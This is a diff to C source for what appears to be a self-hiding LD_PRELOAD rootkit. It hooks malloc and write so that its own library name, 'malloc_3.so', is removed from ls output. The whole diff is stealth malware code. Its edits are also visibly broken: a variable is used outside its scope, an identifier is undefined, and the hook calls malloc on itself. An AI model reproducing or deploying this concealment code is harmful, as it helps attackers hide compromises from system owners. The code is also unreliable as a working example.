@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 
 
 #define FILENAME "malloc_3.so"
@@ -31,7 +32,7 @@ void *malloc(size_t size)
 
 //omit our rootkit from the output of ls
 //function pointer to the original write, initialized to NULL
-static void* (*original_write)(int fd, const void *buf, size_t bytes) = NULL;
+ssize_t (*original_write)(int fd, const void *buf, size_t bytes) = NULL;
 
 //hook for write
 ssize_t write(int fd, const void *buf, size_t bytes)
@@ -49,11 +50,12 @@ ssize_t write(int fd, const void *buf, size_t bytes)
     {
         size_t len = strlen(FILENAME);
         char *new_output = (char*) malloc(strlen(buf) - len);
-        memset(rootkit_found, 0, len);
+        memcpy(new_output, buf, (rootkit_found - (char *) buffer));
+        memcpy(new_output + (rootkit_found - (char *) buffer), rootkit_found + len, strlen(buffer) - len);
     }
 
-    ssize_t write_output = NULL;
-    write_output = original_write(fd, buf, bytes);
+    ssize_t write_output = 0;
+    write_output = original_write(fd, new_output, bytes);
 
     return write_output; 
 }
